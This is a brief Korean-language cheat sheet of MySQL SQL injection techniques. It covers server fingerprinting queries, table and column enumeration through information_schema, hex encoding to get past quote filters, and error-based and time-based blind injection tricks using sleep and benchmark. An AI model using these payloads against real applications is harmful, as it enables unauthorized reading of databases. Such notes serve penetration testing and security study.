    MySQL

    서버 정보 확인

    SELECT @@version; --버전 확인
SELECT database(); --DB 확인
SELECT @@hostname; --호스트이름,IP주소
SELECT user(); --유저 확인
SELECT system_user(); --시스템 유저 확인
SELECT @@datadir; --파일 위치 확인

    테이블 확인

    select database();
select table_name from information_schema.tables where table_schema='DB이름' limit 0,1; --DB이름으로 table_name 확인
select column_name from information_schema.columns where table_name='Table이름' limit 0,1; --Table이름으로 column_name 확인
select Column이름 from Table이름 limit 0,1; --Column이름과 Table이름으로 Column값 확인

    따옴표 필터링 bypass

    SELECT 0x414243; #'ABC'를 0x414243으로 우회

    MySQL Blind Bool based 유형 우회

    1. 9e307*2로 에러 일으키기
    2. order by 뒤에 if나 case로 한 뒤 select 1 union select 2로 에러 일으키기

    MySQL Blind Time based 유형

    1. sleep함수 사용 sleep(1)
    2. benchmark함수 사용 (BENCHMARK(10000000,MD5(‘a’)))
